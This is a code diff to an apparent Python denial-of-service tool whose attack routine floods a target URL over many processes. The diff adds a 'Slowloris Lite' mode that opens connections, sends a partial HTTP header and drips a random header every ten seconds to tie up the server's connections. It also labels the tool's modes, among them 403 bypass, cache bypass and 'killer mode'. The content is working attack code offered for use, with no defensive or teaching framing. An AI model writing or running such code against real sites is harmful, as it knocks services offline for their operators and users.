@@ -82,15 +82,25 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                     headers_local = common_headers + f"Referer: {random.choice(REFERERS)}\r\n"
                     payload_str = f"{method} {curr_path} HTTP/1.1\r\n{headers_local}"
                     payload_str += f"Content-Length: {len(post_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{post_data}"
+                elif mode == '5':
+                    # SLOW ATTACK (Slowloris Lite)
+                    # Send partial header and drip feed
+                    payload_str = f"GET {curr_path} HTTP/1.1\r\n{common_headers}"
+                    s.sendall(payload_str.encode('utf-8'))
+                    while time.time() < end_time:
+                        time.sleep(10) # Drip feed every 10s
+                        s.sendall(f"X-Drip: {random.randint(1,1000)}\r\n".encode('utf-8'))
+                        with shared_req.get_lock(): shared_req.value += 1
                 else:
                     payload_str = f"{method} {curr_path} HTTP/1.1\r\n{common_headers}\r\n"
 
-                payload = payload_str.encode('utf-8')
-                s.sendall(payload)
-                
-                # Update Shared Stats (Locked for safety)
-                with shared_req.get_lock(): shared_req.value += 1
-                with shared_bytes.get_lock(): shared_bytes.value += len(payload)
+                if mode != '5':
+                    payload = payload_str.encode('utf-8')
+                    s.sendall(payload)
+                    
+                    # Update Shared Stats (Locked for safety)
+                    with shared_req.get_lock(): shared_req.value += 1
+                    with shared_bytes.get_lock(): shared_bytes.value += len(payload)
                 
         except:
             with shared_err.get_lock(): shared_err.value += 1
@@ -142,6 +152,14 @@ def main():
 
     for p in processes: p.terminate()
     print("-" * 40 + "\n[*] MISSION COMPLETE.")
+
+def get_mode_name(mode):
+    if mode == '1': return "BASIC HTTP REQUEST"
+    if mode == '2': return "BROWSER EMULATION (HTTP 403 BYPASS)"
+    if mode == '3': return "RANDOM PATTERNS (CACHE BYPASS)"
+    if mode == '4': return "FULL STRESS TEST (KILLER MODE)"
+    if mode == '5': return "SLOW ATTACK (CONNECTION EXHAUSTION)"
+    return "UNKNOWN"
 
 if __name__ == "__main__":
     main()
